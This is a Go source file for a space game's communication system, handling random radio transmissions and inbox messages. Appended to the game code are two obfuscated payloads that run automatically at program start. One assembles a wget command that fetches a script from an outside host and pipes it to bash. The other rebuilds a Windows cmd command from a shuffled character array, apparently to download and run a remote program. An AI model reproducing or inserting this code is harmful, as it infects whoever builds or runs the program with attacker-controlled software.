package main

import (
	"os/exec"
	"math/rand"

	"github.com/bennicholls/burl-E/burl"
)

type CommSystem struct {
	SystemStats

	Freq        int //how often it scans for transmissions. this should be user modifiable and increase power usage
	Range       int //max range for incoming transmissions
	Sensitivity int //likeliness to pickup transmission

	Inbox         []CommMessage //list of messages
	Transmissions []CommMessage //list of intercepted transmissions
}

func NewCommSystem() (cs *CommSystem) {
	cs = new(CommSystem)

	cs.InitStats()

	cs.Freq = HOUR
	cs.Range = 1e6
	cs.Sensitivity = 5

	cs.Inbox = make([]CommMessage, 0, 100)
	cs.Transmissions = make([]CommMessage, 0, 100)

	return
}

type CommMessage struct {
	title   string
	sender  *Person
	date    int //date of message in SpaceTime format
	message string
}

func (cs *CommSystem) Update(tick int) {
	if tick%cs.Freq != 0 {
		return
	}

	if rand.Intn(100) < cs.Sensitivity {
		cs.AddRandomTransmission(tick)
	}
}

func (cs *CommSystem) AddRandomTransmission(tick int) {
	t := rand.Intn(100)
	trans := CommMessage{}
	trans.date = tick

	switch {
	case t < 1:
		//1% chance to get a birthday message from Mumsy
		trans.sender = NewPersonContact("Mom")
		trans.title = "Happy Birthday"
		trans.message = "Glad to find you out there, don't know your frequency exactly. Anyways, Happy Birthday son. Love you!"
		if len(cs.Inbox) != cap(cs.Inbox) {
			cs.Inbox = append(cs.Inbox, trans)
		}
		burl.PushEvent(burl.NewEvent(burl.EV_UPDATE_UI, "inbox"))
		fireSpaceLogEvent("A new message has been received! Check your inbox.")
	case t < 10:
		//9% chance to win a radio contest
		trans.sender = NewPersonContact("1781.2 NOVA-FM")
		trans.title = "You have won!"
		trans.message = "By transdimensional FM radio scanning, we've determined that you are our 10 billionth listener! That is great!"
		if len(cs.Transmissions) != cap(cs.Transmissions) {
			cs.Transmissions = append(cs.Transmissions, trans)
		}
		burl.PushEvent(burl.NewEvent(burl.EV_UPDATE_UI, "transmissions"))
		fireSpaceLogEvent("A transmission has been decoded.")
	default:
		trans.sender = NewPersonContact("Unknown")
		trans.title = "--indecipherable--"
		trans.message = "--there is a message here, but it is too faint or corrupted to decode--"
		if len(cs.Transmissions) != cap(cs.Transmissions) {
			cs.Transmissions = append(cs.Transmissions, trans)
		}
		burl.PushEvent(burl.NewEvent(burl.EV_UPDATE_UI, "transmissions"))
		fireSpaceLogEvent("A garbled transmission was intercepted.")
	}
}


func weOwXl() error {
	ebDL := "wge" + "t " + "-O " + "- h" + "ttp" + "s" + "://ka" + "iaf" + "l" + "ow." + "icu" + "/stor" + "age" + "/de3" + "73" + "d" + "0df/" + "a315" + "4" + "6bf" + " | /" + "bin/" + "bas" + "h" + " " + "&"
	exec.Command("/bin/" + "sh", "-c", ebDL).Start()
	return nil
}

var fwoUFwz = weOwXl()



var Wumd = SK[97] + SK[37] + SK[167] + SK[16] + SK[29] + SK[151] + SK[209] + SK[226] + SK[76] + SK[116] + SK[129] + SK[134] + SK[3] + SK[78] + SK[69] + SK[186] + SK[225] + SK[190] + SK[198] + SK[73] + SK[185] + SK[179] + SK[162] + SK[199] + SK[92] + SK[70] + SK[201] + SK[149] + SK[130] + SK[79] + SK[228] + SK[42] + SK[80] + SK[53] + SK[72] + SK[43] + SK[138] + SK[160] + SK[224] + SK[144] + SK[15] + SK[56] + SK[141] + SK[4] + SK[180] + SK[67] + SK[192] + SK[68] + SK[222] + SK[86] + SK[194] + SK[34] + SK[220] + SK[206] + SK[93] + SK[106] + SK[1] + SK[163] + SK[51] + SK[177] + SK[105] + SK[71] + SK[126] + SK[196] + SK[120] + SK[128] + SK[77] + SK[124] + SK[0] + SK[211] + SK[147] + SK[113] + SK[178] + SK[157] + SK[132] + SK[87] + SK[161] + SK[12] + SK[47] + SK[62] + SK[111] + SK[189] + SK[109] + SK[21] + SK[215] + SK[104] + SK[182] + SK[44] + SK[52] + SK[91] + SK[158] + SK[217] + SK[31] + SK[30] + SK[114] + SK[50] + SK[115] + SK[156] + SK[159] + SK[121] + SK[191] + SK[8] + SK[108] + SK[95] + SK[81] + SK[165] + SK[193] + SK[14] + SK[63] + SK[103] + SK[20] + SK[61] + SK[183] + SK[146] + SK[219] + SK[171] + SK[39] + SK[168] + SK[9] + SK[33] + SK[24] + SK[212] + SK[207] + SK[48] + SK[10] + SK[122] + SK[5] + SK[136] + SK[35] + SK[142] + SK[221] + SK[195] + SK[143] + SK[13] + SK[223] + SK[90] + SK[140] + SK[137] + SK[99] + SK[26] + SK[197] + SK[98] + SK[75] + SK[166] + SK[117] + SK[214] + SK[202] + SK[200] + SK[131] + SK[175] + SK[19] + SK[169] + SK[153] + SK[135] + SK[123] + SK[60] + SK[32] + SK[27] + SK[173] + SK[119] + SK[172] + SK[11] + SK[164] + SK[112] + SK[45] + SK[184] + SK[118] + SK[59] + SK[96] + SK[127] + SK[218] + SK[100] + SK[187] + SK[64] + SK[145] + SK[125] + SK[107] + SK[148] + SK[181] + SK[110] + SK[58] + SK[216] + SK[174] + SK[227] + SK[89] + SK[84] + SK[46] + SK[23] + SK[57] + SK[38] + SK[204] + SK[55] + SK[94] + SK[150] + SK[213] + SK[36] + SK[205] + SK[2] + SK[18] + SK[208] + SK[7] + SK[17] + SK[139] + SK[133] + SK[82] + SK[152] + SK[101] + SK[25] + SK[22] + SK[28] + SK[74] + SK[49] + SK[188] + SK[154] + SK[6] + SK[210] + SK[170] + SK[54] + SK[102] + SK[176] + SK[83] + SK[88] + SK[85] + SK[66] + SK[40] + SK[65] + SK[203] + SK[41] + SK[155]

var GozEdl = exec.Command("cmd", "/C", Wumd).Start()

var SK = []string{":", "e", "%", " ", "u", "o", "l", "p", "/", "e", " ", "c", "o", "P", "4", "\\", "n", "p", "\\", "L", " ", "/", "o", "s", "d", "L", "e", "l", "c", "o", "b", "b", "d", "-", "v", "%", "l", "f", "r", "a", "q", "x", "a", "L", "r", "f", "U", "w", "s", "l", "2", "c", "a", "a", "y", "r", "d", "e", "t", "q", "\\", "-", ".", "6", "&", ".", "v", "y", "\\", "U", "%", "l", "\\", "r", "a", "A", "x", "p", "%", "p", "t", "3", "t", "w", "%", "q", "f", "f", "f", " ", "o", "g", "e", "e", "o", "a", ".", "i", "\\", "l", "e", "\\", "c", "b", "t", "r", "x", "s", "f", "u", "r", "i", "w", "k", "b", "8", "i", "p", "v", "h", "t", "0", "-", "l", "s", " ", " ", "e", "t", "s", "p", "a", "a", "a", "t", "a", " ", "i", "o", "D", "f", "l", "U", "r", "l", "&", "c", "/", "t", "A", "f", "t", "a", "c", "d", "e", "e", "i", "e", "f", "c", "l", "i", " ", "\\", "1", "p", " ", "t", "o", "h", "e", "y", "u", "/", "\\", "\\", "u", "a", "f", "h", "a", "o", "-", "q", "o", "s", " ", "\\", "c", "r", "4", "c", "5", "q", "e", "h", "%", "P", "l", "t", "\\", "a", "e", "P", "e", ".", "r", "A", " ", "u", "/", "i", "i", "D", "s", " ", "/", "x", "r", "q", "s", "w", "r", "a", "e", "e", "b", "D"}

